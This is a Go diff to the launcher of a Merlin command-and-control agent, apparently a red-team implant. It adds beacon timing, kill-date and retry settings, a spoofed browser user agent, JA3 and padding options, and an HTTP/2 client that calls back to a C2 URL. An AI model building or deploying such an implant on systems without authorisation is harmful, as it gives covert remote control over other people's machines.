@@ -26,6 +26,7 @@ import (
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg/agent"
+	"github.com/Ne0nd0g/merlin/pkg/agent/clients/http"
 )
 
 var url = "https://127.0.0.1:443"
@@ -33,15 +34,51 @@ var psk = "merlin"
 var proxy = ""
 var host = ""
 var ja3 = ""
+var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+var sleep = "30s"
+var skew = "3000"
+var killdate = "0"
+var maxretry = "7"
+var padding = "4096"
+var opaque []byte
+var protocol = "h2"
 
 func main() {}
 
 // run is a private function called by exported functions to instantiate/execute the Agent
 func run(URL string) {
-	a, err := agent.New("h2", URL, host, psk, proxy, ja3, false, false)
+	// Setup and run agent
+	agentConfig := agent.Config{
+		Sleep:    sleep,
+		Skew:     skew,
+		KillDate: killdate,
+		MaxRetry: maxretry,
+	}
+	a, err := agent.New(agentConfig)
 	if err != nil {
 		os.Exit(1)
 	}
+
+	// Get the client
+	var errClient error
+	clientConfig := http.Config{
+		AgentID:     a.ID,
+		Protocol:    protocol,
+		Host:        host,
+		URL:         URL,
+		Proxy:       proxy,
+		UserAgent:   useragent,
+		PSK:         psk,
+		JA3:         ja3,
+		Padding:     padding,
+		AuthPackage: "opaque",
+		Opaque:      opaque,
+	}
+	a.Client, errClient = http.New(clientConfig)
+	if errClient != nil {
+		os.Exit(1)
+	}
+
 	errRun := a.Run()
 	if errRun != nil {
 		os.Exit(1)
